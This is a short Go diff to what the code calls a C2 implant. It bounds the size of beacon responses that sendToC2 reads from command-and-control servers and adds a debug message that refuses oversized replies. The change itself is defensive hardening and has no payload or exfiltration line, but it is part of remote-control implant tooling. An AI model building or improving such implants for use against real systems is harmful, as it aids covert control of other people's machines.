@@ -16,6 +16,11 @@ import (
 	"time"
 )
 
+// maxBeaconResponseBytes bounds a single C2 response. The server caps beacon
+// envelopes well below this; the limit exists so a rogue endpoint cannot turn
+// the implant into an unbounded buffer.
+const maxBeaconResponseBytes = 16 << 20 // 16 MiB
+
 // c2URLsSnapshot returns a stable snapshot of the C2 URL list. The slice is
 // never mutated after being published via c2URLsStore, so callers may iterate
 // it without locking. Reading the old C2URLs slice directly (with a separate
@@ -176,8 +181,18 @@ func sendToC2(idx int, body []byte) []byte {
 		return nil
 	}
 
-	data, err := io.ReadAll(resp.Body)
+	// Bound the response: a hostile or misconfigured endpoint must not be
+	// able to make the implant buffer an arbitrary amount of memory. Read one
+	// byte past the cap so an oversized body is detected instead of silently
+	// truncated into a corrupt envelope.
+	data, err := io.ReadAll(io.LimitReader(resp.Body, maxBeaconResponseBytes+1))
 	if err != nil {
+		return nil
+	}
+	if len(data) > maxBeaconResponseBytes {
+		if Debug {
+			fmt.Printf("[!] Beacon response from %s exceeds %d bytes; refusing\n", url, maxBeaconResponseBytes)
+		}
 		return nil
 	}
 	if Debug {
